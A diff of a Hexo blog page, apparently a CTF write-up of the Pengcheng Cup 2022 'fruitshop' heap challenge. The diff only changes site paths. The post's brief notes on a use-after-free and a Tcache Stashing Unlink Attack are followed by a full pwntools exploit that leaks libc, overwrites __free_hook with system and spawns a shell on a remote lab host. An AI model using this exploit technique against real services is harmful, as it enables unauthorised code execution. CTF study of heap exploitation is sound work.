@@ -5,31 +5,31 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="delete没有清空指针  Add只能malloc固定规格size到堆  其中add_durian使用calloc，而其他使用malloc，且能够通过切割unsorted bin，产生0x120的small bin chunk">
 <meta property="og:type" content="article">
 <meta property="og:title" content="鹏城杯2022_fruitshop">
-<meta property="og:url" content="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/index.html">
+<meta property="og:url" content="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="delete没有清空指针  Add只能malloc固定规格size到堆  其中add_durian使用calloc，而其他使用malloc，且能够通过切割unsorted bin，产生0x120的small bin chunk">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/3.png">
+<meta property="og:image" content="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/1.png">
+<meta property="og:image" content="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/2.png">
+<meta property="og:image" content="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/3.png">
 <meta property="article:published_time" content="2022-07-04T02:20:43.000Z">
 <meta property="article:modified_time" content="2025-06-26T07:17:44.572Z">
 <meta property="article:author" content="ha1vk">
@@ -38,9 +38,9 @@
 <meta property="article:tag" content="tcache_max阀值">
 <meta property="article:tag" content="glibc 2.31">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/1.png">
+<meta name="twitter:image" content="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/">
+<link rel="canonical" href="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/">
 
 
 <script id="page-configurations">
@@ -102,7 +102,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -123,27 +123,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -201,10 +201,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -239,7 +239,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -262,11 +262,11 @@
 
       
         <p>delete没有清空指针</p>
-<img src="/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/1.png" class="">
+<img src="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/1.png" class="">
 <p>Add只能malloc固定规格size到堆</p>
-<img src="/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/2.png" class="">
+<img src="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/2.png" class="">
 <p>其中add_durian使用calloc，而其他使用malloc，且能够通过切割unsorted bin，产生0x120的small bin chunk</p>
-<img src="/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/3.png" class="">
+<img src="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/3.png" class="">
 <p>于是可以使用Tcache Stashing Unlink Attack修改tcache_max阀值，将所有的chunk以tcache的形式管理，就能够使用tcache attack进行任意地址分配</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./fruitshop_patch&#x27;)</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./fruitshop&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;192.168.1.107&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">type</span>,index,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">type</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">type</span>,index,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">type</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;Apple&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(content) &lt; <span class="number">0x200</span>:</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Do~&#x27;</span>,content)</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Re~&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Mi~&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Fa~&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Do~&#x27;</span>,content[<span class="number">0</span>:<span class="number">0x200</span>])</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Re~&#x27;</span>,content[<span class="number">0x200</span>:<span class="number">0xcb0</span>])</span><br><span class="line">         sh.sendafter(<span class="string">&#x27;Mi~&#x27;</span>,content[<span class="number">0xcb0</span>:])</span><br><span class="line">         <span class="comment">#sh.sendlineafter(&#x27;Fa~&#x27;,content[0xdb0:0xdd0])</span></span><br><span class="line">         <span class="comment">#sh.sendlineafter(&#x27;Fa~&#x27;,&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      sh.sendafter(<span class="string">&#x27;\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">type</span>,index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">type</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">type</span>,index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">type</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xdd0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">   add(<span class="string">&#x27;Durian&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x110</span>)</span><br><span class="line">   delete(<span class="string">&#x27;Durian&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xdd0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&#x27;Durian&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Content is&#x27;</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_addr=&#x27;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Content is&#x27;</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line">tcache_max = libc_base + <span class="number">0x1ec2d0</span></span><br><span class="line">system_addr = libc_base +  libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;tcache_max=&#x27;</span>,<span class="built_in">hex</span>(tcache_max)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Banana&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xcb0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xdd0</span>)</span><br><span class="line">add(<span class="string">&#x27;Banana&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xcb0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">&#x27;Banana&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xcb0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xdd0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="comment">#edit(&#x27;Apple&#x27;,1,&#x27;a&#x27;*0xcb0 + p64(0) + p64(0x121) + p64(heap_addr - 0x5b0) + p64(tcache_max - 0x10))</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;Apple&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Do~&#x27;</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Re~&#x27;</span>,<span class="string">&#x27;r\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Mi~&#x27;</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x121</span>) + p64(heap_addr - <span class="number">0x5b0</span>) + p64(tcache_max - <span class="number">0x10</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Fa~&#x27;</span>,<span class="string">&#x27;r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Tcache Stashing Unlink Attack修改tcache_max</span></span><br><span class="line">add(<span class="string">&#x27;Durian&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache attack</span></span><br><span class="line">delete(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">2</span>,p64(free_hook_addr) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">1</span>,p64(system_addr) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="string">&#x27;Apple&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
     </div>
@@ -277,10 +277,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/tcache/" rel="tag"># tcache</a>
-              <a href="/ha1vk/tags/Tcache-Stashing-Unlink-Attack/" rel="tag"># Tcache Stashing Unlink Attack</a>
-              <a href="/ha1vk/tags/tcache-max%E9%98%80%E5%80%BC/" rel="tag"># tcache_max阀值</a>
-              <a href="/ha1vk/tags/glibc-2-31/" rel="tag"># glibc 2.31</a>
+              <a href="/tags/tcache/" rel="tag"># tcache</a>
+              <a href="/tags/Tcache-Stashing-Unlink-Attack/" rel="tag"># Tcache Stashing Unlink Attack</a>
+              <a href="/tags/tcache-max%E9%98%80%E5%80%BC/" rel="tag"># tcache_max阀值</a>
+              <a href="/tags/glibc-2-31/" rel="tag"># glibc 2.31</a>
           </div>
 
         
@@ -289,11 +289,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-Afruit/" rel="prev" title="鹏城杯2022_Afruit">
+    <a href="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-Afruit/" rel="prev" title="鹏城杯2022_Afruit">
       <i class="fa fa-chevron-left"></i> 鹏城杯2022_Afruit
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-rainbow-cat/" rel="next" title="鹏城杯2022_rainbow_cat">
+    <a href="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-rainbow-cat/" rel="next" title="鹏城杯2022_rainbow_cat">
       鹏城杯2022_rainbow_cat <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -365,20 +365,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -451,30 +451,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
